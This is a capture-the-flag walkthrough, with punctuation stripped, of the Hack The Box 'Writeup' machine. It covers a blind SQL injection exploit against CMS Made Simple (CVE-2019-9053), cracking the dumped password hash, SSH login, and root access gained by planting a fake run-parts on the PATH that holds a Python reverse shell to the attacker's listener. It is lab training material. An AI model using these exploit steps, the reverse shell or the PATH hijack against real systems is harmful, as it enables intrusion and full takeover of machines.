message 201909011050471387x643scrothttpsuserimagesgithubusercontentcom907674764074062b592c900cc9511e997eb5199438c8febpng So there a DOS protection checking apache logs for 40X errors Probably a fail2ban or something Lets avoid classic enumeration scripts to not get banned The footer says Page is handcrafted with vi Thats an interesting fact to keep in mind maybe can access vi backups file something like indexphp or indexphpswp and have a look at the source code The writeup endpoint countains well writeups The website seems rather basic 201909011057471455x764scrothttpsuserimagesgithubusercontentcom907674764074102a3fdf100cc9611e992fb53bcb44da0bapng Each writeup is accessible throught the URL in the following form httpwriteuphtbwriteupindexphppagewriteupname After digging a bit we found there is no Local File Inclusion vulnerabilities nor vim backup files accessible Exploit Checking the source code inform us that the website was made using CMS Made Simple http hg8archbook http writeuphtbwriteupindexphp HTTP11 200 OK Server Apache2425 Debian SetCookie CMSSESSID9d3962lgt7j00rvndgl4 path Vary AcceptEncoding Home writeup A quick search return a fairly recent vulnerability CVE20199053 An issue was discovered in CMS Made Simple 228 It is possible with the News module through a crafted URL to achieve unauthenticated blind timebased SQL injection via the m1idlist parameter And an exploit is already available perfect Looking at the source code we can see we have a very well crafted and complete exploit It will 1 Dump the salt used by CMS Made Simple 2 Dump the username 3 Dump the email 4 Dump the password 5 And even have a function to crack the found hashed password Lets try it bash hg8archbook wget httpswwwexploitdbcomraw46635 O cmssimplepy hg8archbook python cmssimplepy u httpwriteuphtbwriteup crack w SecListsPasswordsLeakedDatabasesrockyoutxt Salt for password found 5a599ef579066807 Username found jkr Email found jkrwriteuphtb Password found 62def4866937f08cc13bab43bb14e6f7 Password cracked raykayjay9 Really nice exploit here So we have an username and a password The CMS Made Simple admin page can not be accessed using those credentials so lets try with SSH bash ssh jkrwriteuphtb jkrwriteuphtbs password Linux writeup 4908amd64 x8664 GNULinux The programs included with the Devuan GNULinux system are free software the exact distribution terms for each program are described in the individual files in usrsharedoccopyright Devuan GNULinux comes with ABSOLUTELY NO WARRANTY to the extent permitted by applicable law Last login Sun Sep 1 050751 2019 from 10101085 jkrwriteup cat usertxt d4e493fd40xxxxxxxxxxxxxx319f978 jkrwriteup Root Flag Recon As a recon phase lets run pspyhttpsgithubcomDominicBreukerpspy to check running process And paying closer attention de process run as root bash Attacker box hg8archbook wget httpsgithubcomDominicBreukerpspyreleasesdownloadv120pspy64 hg8archbook scp pspy64 jkrwriteuphtb jkrwriteuphtbs password pspy64 100 3006KB 1119KBs 0026 bash jkrwriteup chmod x pspy64 pspy64 After watching the processes for a while we will see a few other users succeding the user challenge and connect to SSH aswell And something interresting appears bash 053715 CMD UID0 PID11674 sshd accepted 053715 CMD UID102 PID11675 sshd net 053729 CMD UID0 PID11676 sshd jkr priv 053729 CMD UID0 PID11677 sh c usrbinenv i PATHusrlocalsbinusrlocalbinusrsbinusrbinsbinbin runparts lsbsysinit etcupdatemotdd runmotddynamicnew 053729 CMD UID0 PID11678 runparts lsbsysinit etcupdatemotdd 053729 CMD UID0 PID11679 uname rnsom 053729 CMD UID0 PID11680 sshd jkr priv 053729 CMD UID1000 PID11681 sshd jkrpts2 A few commands are run as root upon users login Lets dig First command that caught the attention is runparts lsbsysinit etcupdatemotdd bash hg8archbook man runparts runparts runs all the executable files named within constraints described below found in directory directory Sounds promising If we can add a script to etcupdatemotdd it will be executed as root on next login Unfortunately we dont have writting rights to etcupdatemotdd nor to the file present in it bash jkrwriteup ls l etcupdatemotdd total 4 rwxrxrx 1 root root 23 Jun 3 2018 10uname That looks like a dead end here Another thing we noticed is that executable are called in relative path and not absolute And the first command gives the full PATH env variable before launching the runparts command bash sh c usrbinenv i PATHusrlocalsbinusrlocalbinusrsbinusrbinsbinbin runparts lsbsysinit etcupdatemotdd runmotddynamicnew As a reminder when a command is called Linux will search in the PATH environement variable to find where this executable is located So in the command above Linux system will first look in the usrlocalsbin to see if runparts is there then in usrlocalbin etc Lets check where runparts is bash jkrwriteup which runparts binrunparts So its bin folder the last on the PATH list That mean if we can write an executable named runparts in either usrlocalsbin usrlocalbin usrsbin usrbin sbin then it will be ran instead of the real binrunparts and as root If we have writting rights in any of those folder then its bingo Privilege escalation bash Bash reserve shell doesnt work lets use the python one jkrwriteup cat usrlocalsbinrunparts python c import socketsubprocessosssocketsocketsocketAFINETsocketSOCKSTREAMsconnect101010858585osdup2sfileno0 osdup2sfileno1 osdup2sfileno2psubprocesscallbinshi jkrwriteup chmod x usrlocalsbinrunparts jkrwriteup Lets listen to incoming connection nc l vv p 8585 Listening on any address 8585 Now we logout and login again to the box to initiate the sh c usrbinenv i PATHusrlocalsbinusrlocalbinusrsbinusrbinsbinbin runparts lsbsysinit etcupdatemotdd runmotddynamicnew command And surely we receive the connection immediatly bash nc l vv p 8585 Listening on any address 8585 Connection from 10101013837078 id uid0root gid0root groups0root cat rootroottxt eeba4xxxxxxxxxxxx8d7226 Thats it As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"search","href":"content/search.html","content":" title Search Results "}]